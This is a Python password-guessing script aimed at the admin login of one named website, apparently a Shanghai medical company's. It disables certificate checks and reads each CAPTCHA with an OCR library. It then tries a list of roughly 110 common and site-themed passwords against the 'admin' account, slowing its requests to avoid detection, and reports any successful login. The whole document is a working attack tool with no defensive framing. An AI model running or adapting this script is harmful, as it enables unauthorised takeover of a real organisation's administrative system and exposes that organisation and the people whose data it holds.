#!/usr/bin/env python3
"""1mmed 优化爆破(降频+单用户)"""
import urllib.request, http.cookiejar, ssl, sys, time
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://1mmed.com"
ocr = ddddocr.DdddOcr(show_ad=False)

def new_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    op.addheaders = [("User-Agent","Mozilla/5.0")]
    return op

def try_login(user, pw, max_attempts=5):
    op = new_opener()
    try:
        op.open(f"{B}/admin.php", timeout=6).read()
    except Exception:
        return "CONN"
    for i in range(max_attempts):
        try:
            cap = op.open(f"{B}/admin.php/Code/index", timeout=6).read()
            code = ocr.classification(cap)
        except Exception:
            time.sleep(1)
            continue
        if len(code) < 4:
            continue
        try:
            r = op.open(urllib.request.Request(f"{B}/admin.php", data=f"username={user}&pwd={pw}&code={code}&TenantId=".encode()), timeout=6)
            url = r.geturl()
            body = r.read().decode("utf-8","ignore")
            if "Login" not in url and "login" not in url:
                return "SUCCESS"
            if "验证码错误" in body:
                continue
            return "AUTH_WRONG"
        except Exception:
            time.sleep(1)
            continue
    return "VERIFY_FAIL"

pwds = ["admin123","123456","admin","admin888","12345678","a123456","admin@123",
        "123123","111111","888888","000000","123456789","abc123","passw0rd",
        "Admin123","Admin888","yimu123","yimu888","1mmed123","shanghai123",
        "admin2024","admin2025","admin2026","qwe123","zxc123","147258369",
        "5201314","woaini","123456a","Aa123456","admin!@#","admin#123",
        "123qwe","asd123","1234567890","1qaz2wsx","qazwsx","zxcvbnm",
        "admin123456","Admin@123","admin666","admin999","test123","test123456",
        "admin1234","admin12345","123456789a","a123456789","admin000","admin001",
        "shanghaiyimu","yimu123456","1mmed2024","1mmed2025","1mmed2026",
        "admin@2024","admin@2025","admin@2026","medical123","yimu@123",
        "admin1","admin2","admin3","admin01","admin02","root","root123",
        "toor","administrator","Admin1234","admin12345","1mmed","1mmed888",
        "yimu8888","yimu666","shanghai888","medical888","1234567890a",
        "qwer1234","asdf1234","zxcv1234","1q2w3e4r","!@#$%^&*","q1w2e3r4",
        "admin@2020","admin@2021","admin@2022","admin@2023","yimu2020","yimu2021",
        "yimu2022","yimu2023","yimu2024","yimu2025","yimu2026","1mmed2020",
        "1mmed2021","1mmed2022","1mmed2023","shanghai2020","shanghai2021",
        "shanghai2022","shanghai2023","shanghai2024","shanghai2025","shanghai2026"]

print(f"用户admin 密码数={len(pwds)}", flush=True)
count = 0
for pw in pwds:
    r = try_login("admin", pw)
    count += 1
    if count % 20 == 0:
        print(f"[{count}] 到 {pw}", flush=True)
    if r == "SUCCESS":
        print(f"!!!!! admin/{pw} 登录成功!", flush=True)
        sys.exit(0)
    if r == "VERIFY_FAIL":
        print(f"  {pw}: verify fail", flush=True)
    time.sleep(0.5)
print("DONE", flush=True)
